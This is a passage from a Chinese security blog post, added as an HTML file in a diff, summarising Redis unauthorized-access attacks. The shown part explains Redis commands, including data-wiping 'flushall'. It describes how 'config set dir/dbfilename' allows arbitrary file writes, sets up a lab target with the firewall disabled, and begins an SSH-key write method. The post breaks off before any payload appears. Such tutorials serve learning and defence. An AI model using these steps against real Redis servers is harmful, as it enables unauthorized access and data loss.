@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Redis未授权访问总结 | Hexo</title>
+  <meta name="keywords" content=" Redis ">
+  <meta name="description" content="Redis未授权访问总结 | Hexo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="FastjsonFastjson姿势技巧集合 说明持续更新，手工yyds。 探测用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。    主要是利用各个类被加入黑名单的方式进行判断 fastjson &gt;1.2.43 &amp;#123;&quot;@typ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson系列总结">
+<meta property="og:url" content="http://example.com/2021/08/31/Fastjson%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="FastjsonFastjson姿势技巧集合 说明持续更新，手工yyds。 探测用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。    主要是利用各个类被加入黑名单的方式进行判断 fastjson &gt;1.2.43 &amp;#123;&quot;@typ">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-08-31T05:48:04.000Z">
+<meta property="article:modified_time" content="2021-08-31T07:17:48.168Z">
+<meta property="article:author" content="Alex">
+<meta property="article:tag" content="Fastjson">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Alex</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="rss"
+               href="/atom.xml"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-rss"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="github"
+               href="https://github.com/SwagXz"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:1824582879@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(14)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="基础知识">
+                        
+                        基础知识
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="域渗透">
+                        
+                        域渗透
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        <a 
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="14">
+<input type="hidden" id="yelog_site_word_count" value="24.1k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>工具</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞复现</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>逻辑漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>内网</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>修复建议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>应急响应</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>域渗透</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Fastjson</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Hexo</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Redis</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL注入</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All "
+           href="/2021/08/31/Fastjson%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/"
+           data-tag="Fastjson"
+           data-author="" >
+            <span class="post-title" title="Fastjson系列总结">Fastjson系列总结</span>
+            <span class="post-date" title="2021-08-31 13:48:04">2021/08/31</span>
+        </a>
+        
+        <a  class="All "
+           href="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"
+           data-tag="漏洞复现"
+           data-author="" >
+            <span class="post-title" title="CVE-2020-15148Yii2反序列化RCE分析与复现">CVE-2020-15148Yii2反序列化RCE分析与复现</span>
+            <span class="post-date" title="2021-01-08 18:21:18">2021/01/08</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞复现"
+           data-author="" >
+            <span class="post-title" title="SMBGhost命令执行漏洞">SMBGhost命令执行漏洞</span>
+            <span class="post-date" title="2020-12-31 13:55:33">2020/12/31</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="漏洞复现"
+           data-author="" >
+            <span class="post-title" title="CVE2020-1472漏洞复现">CVE2020-1472漏洞复现</span>
+            <span class="post-date" title="2020-11-19 17:31:29">2020/11/19</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/"
+           data-tag="Python"
+           data-author="" >
+            <span class="post-title" title="基于绿盟与Nessus原始漏洞的快速处理">基于绿盟与Nessus原始漏洞的快速处理</span>
+            <span class="post-date" title="2020-11-15 20:46:32">2020/11/15</span>
+        </a>
+        
+        <a  class="All 基础知识 "
+           href="/2020/08/11/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"
+           data-tag="SQL注入"
+           data-author="" >
+            <span class="post-title" title="SQL手工注入总结">SQL手工注入总结</span>
+            <span class="post-date" title="2020-08-11 10:58:58">2020/08/11</span>
+        </a>
+        
+        <a  class="All 基础知识 "
+           href="/2020/07/29/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"
+           data-tag="修复建议"
+           data-author="" >
+            <span class="post-title" title="修复方式总结">修复方式总结</span>
+            <span class="post-date" title="2020-07-29 09:49:17">2020/07/29</span>
+        </a>
+        
+        <a  class="All 域渗透 "
+           href="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/"
+           data-tag="域渗透,内网"
+           data-author="" >
+            <span class="post-title" title="Kerberos 协议">Kerberos 协议</span>
+            <span class="post-date" title="2020-07-06 10:25:07">2020/07/06</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/"
+           data-tag="Redis"
+           data-author="" >
+            <span class="post-title" title="Redis未授权访问总结">Redis未授权访问总结</span>
+            <span class="post-date" title="2020-06-20 11:25:11">2020/06/20</span>
+        </a>
+        
+        <a  class="All 基础知识 "
+           href="/2020/05/12/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"
+           data-tag="SQL注入"
+           data-author="" >
+            <span class="post-title" title="SQL基础知识总结">SQL基础知识总结</span>
+            <span class="post-date" title="2020-05-12 10:42:50">2020/05/12</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/04/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%91%E5%9B%BE/"
+           data-tag="应急响应"
+           data-author="" >
+            <span class="post-title" title="应急响应脑图">应急响应脑图</span>
+            <span class="post-date" title="2020-04-15 10:20:57">2020/04/15</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/03/16/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"
+           data-tag="工具"
+           data-author="" >
+            <span class="post-title" title="常用工具汇总">常用工具汇总</span>
+            <span class="post-date" title="2020-03-16 10:45:47">2020/03/16</span>
+        </a>
+        
+        <a  class="All 基础知识 "
+           href="/2020/02/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="逻辑漏洞"
+           data-author="" >
+            <span class="post-title" title="逻辑漏洞总结">逻辑漏洞总结</span>
+            <span class="post-date" title="2020-02-07 08:36:28">2020/02/07</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/02/05/Hexo%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"
+           data-tag="Hexo"
+           data-author="" >
+            <span class="post-title" title="Hexo基本操作">Hexo基本操作</span>
+            <span class="post-date" title="2020-02-05 13:18:26">2020/02/05</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-redis未授权访问总结" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Redis未授权访问总结</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">Redis</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2020-09-07 11:11:48'>2020-06-20 11:25</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:3.8k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E5%9F%BA%E7%A1%80"><span class="toc-text">Redis基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E7%AE%80%E4%BB%8B"><span class="toc-text">Redis简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-text">Redis常用命令：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="toc-text">Redis基本操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-text">Redis配置文件参数：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">利用原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="toc-text">环境搭建：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%86%99-ssh-keygen-%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">1、写 ssh-keygen 公钥登录服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-text">条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-text">详细步骤：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">2、利用计划任务反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A-1"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A-1"><span class="toc-text">条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%EF%BC%9A-1"><span class="toc-text">详细步骤：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81Redis%E7%9B%B4%E6%8E%A5%E5%86%99webshell"><span class="toc-text">3、Redis直接写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A-2"><span class="toc-text">条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4"><span class="toc-text">详细步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6getshell"><span class="toc-text">4、Redis主从复制getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A-2"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A-3"><span class="toc-text">条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%EF%BC%9A-2"><span class="toc-text">详细步骤：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E7%BB%93%E5%90%88SSRF%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-text">5、结合SSRF进行利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81redis%E5%86%99lua"><span class="toc-text">6、redis写lua</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E8%84%9A%E6%9C%AC"><span class="toc-text">批量检测未授权redis脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-text">redis未授权漏洞应急响应案例：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8B%93%E5%B1%95%EF%BC%9A"><span class="toc-text">利用拓展：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-text">修复方案：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E7%A6%81%E6%AD%A2%E4%B8%80%E4%BA%9B%E9%AB%98%E5%8D%B1%E5%91%BD%E4%BB%A4%EF%BC%88%E9%87%8D%E5%90%AFredis%E6%89%8D%E8%83%BD%E7%94%9F%E6%95%88"><span class="toc-text">1、禁止一些高危命令（重启redis才能生效)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E4%BB%A5%E4%BD%8E%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C-Redis-%E6%9C%8D%E5%8A%A1%EF%BC%88%E9%87%8D%E5%90%AFredis%E6%89%8D%E8%83%BD%E7%94%9F%E6%95%88%EF%BC%89"><span class="toc-text">2、以低权限运行 Redis 服务（重启redis才能生效）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%B8%BA-Redis-%E6%B7%BB%E5%8A%A0%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81%EF%BC%88%E9%87%8D%E5%90%AFredis%E6%89%8D%E8%83%BD%E7%94%9F%E6%95%88%EF%BC%89"><span class="toc-text">3、为 Redis 添加密码验证（重启redis才能生效）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E7%A6%81%E6%AD%A2%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE-Redis%EF%BC%88%E9%87%8D%E5%90%AFredis%E6%89%8D%E8%83%BD%E7%94%9F%E6%95%88%EF%BC%89"><span class="toc-text">4、禁止外网访问 Redis（重启redis才能生效）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-text">5、修改默认端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E4%BF%9D%E8%AF%81-authorized-keys-%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%89%E5%85%A8"><span class="toc-text">6、保证 authorized_keys 文件的安全</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E8%AE%BE%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5"><span class="toc-text">7、设置防火墙策略</span></a></li></ol></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>redis的未授权漏洞一直都是一个很火的漏洞，最近看许多前辈的文章后根据自己的实践再次总结一下，为日后复习方便回顾。</p>
+<h1 id="Redis基础"><a href="#Redis基础" class="headerlink" title="Redis基础"></a>Redis基础</h1><h2 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h2><pre><code>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括
+string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希
+类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且
+这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了
+保证效率，数据都是缓存在内   存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操
+作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。
+</code></pre>
+<h2 id="Redis常用命令："><a href="#Redis常用命令：" class="headerlink" title="Redis常用命令："></a>Redis常用命令：</h2><pre><code>     set xz &quot;Hacker&quot;                     # 设置键xz的值为字符串Hacker
+      get xz                              # 获取键xz的内容
+      SET score 857                       # 设置键score的值为857
+      INCR score                          # 使用INCR命令将score的值增加1
+      GET score                           # 获取键score的内容
+      keys *                              # 列出当前数据库中所有的键
+      config set protected-mode no       # 关闭安全模式
+      get anotherkey                      # 获取一个不存在的键的值
+      config set dir /root/redis          # 设置保存目录
+      config set dbfilename redis.rdb     # 设置保存文件名
+      config get dir                      # 查看保存目录
+      config get dbfilename               # 查看保存文件名
+      save                                # 进行一次备份操作
+      flushall                            # 删除所有数据
+      del key                             # 删除键为key的数据
+      slaveof ip port                 # 设置主从关系
+      redis-cli -h ip -p 6379 -a passwd   # 外部连接
+</code></pre>
+<h2 id="Redis基本操作"><a href="#Redis基本操作" class="headerlink" title="Redis基本操作"></a>Redis基本操作</h2><pre><code>1.使用SET和GET命令，可以完成基本的赋值和取值操作；
+2.Redis是不区分命令的大小写的，set和SET是同一个意思；
+3.使用keys *可以列出当前数据库中的所有键；
+4.当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；
+5.如果键的值中有空格，需要使用双引号括起来，如&quot;Hello World&quot;；
+</code></pre>
+<h2 id="Redis配置文件参数："><a href="#Redis配置文件参数：" class="headerlink" title="Redis配置文件参数："></a>Redis配置文件参数：</h2><p>执行命令：ps aux | grep redis搜索redis配置文件位置</p>
+<ul>
+<li><p>port参数</p>
+<p>格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。</p>
+</li>
+<li><p>bind参数</p>
+<p>格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.1.100 10.0.0.1，表允许192.168.1.100和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，说白了就是白名单。</p>
+</li>
+<li><p>save参数</p>
+<p>格式为save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：</p>
+<p>save 900 1</p>
+<p>save 300 10</p>
+<p>save 60 10000</p>
+<p>表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。</p>
+</li>
+<li><p>requirepass参数</p>
+<p>格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。</p>
+</li>
+<li><p>dir参数</p>
+<p>格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。</p>
+</li>
+<li><p>dbfilename参数</p>
+<p>格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。</p>
+</li>
+<li><p>config命令</p>
+<p>通过config命令可以读取和设置dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。</p>
+</li>
+<li><p>protected-mode参数</p>
+<p>安全模式，高版本默认为yes</p>
+</li>
+</ul>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p>
+<ul>
+<li>RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照</li>
+<li>AOF 持久化记录服务器执行的所有写操作命令.</li>
+</ul>
+<p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p>
+<ul>
+<li>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</li>
+</ul>
+<h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>靶机：unbantu 16</p>
+<pre><code>为快速复现，默认apt-get安装
+先进行更新
+sudo apt-get upgrade
+安装
+sudo apt-get install redis-server
+默认安装到 /usr/bin/redis-server
+直接启动服务就可以执行redis-server或者redis-server （配置文件目录）
+注意要将配置文件中的bind参数改为0.0.0.0，允许外连。
+还需要关闭防火墙，具体命令：sudo ufw disable  查看防火墙状态：sudo ufw status  
+</code></pre>
+<p>配置文件修改：</p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/2.jpg"></p>
+<p>开启服务</p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/1.jpg"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="1、写-ssh-keygen-公钥登录服务器"><a href="#1、写-ssh-keygen-公钥登录服务器" class="headerlink" title="1、写 ssh-keygen 公钥登录服务器"></a>1、写 ssh-keygen 公钥登录服务器</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>SSH免密登录的原理：</p>
+<p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p>
+<p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p>
+<blockquote>
+<p>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端； （2）客户端发起登录请求，发送自己的相关信息； （3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录，若有则生成一段随机数使用该公钥加密后发送给客户端； （4）客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证； （5）服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对，若一样则允许登录，不一样则拒绝登录。</p>
+</blockquote>
+<h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h4><p>1、Redis服务使用ROOT账号启动</p>
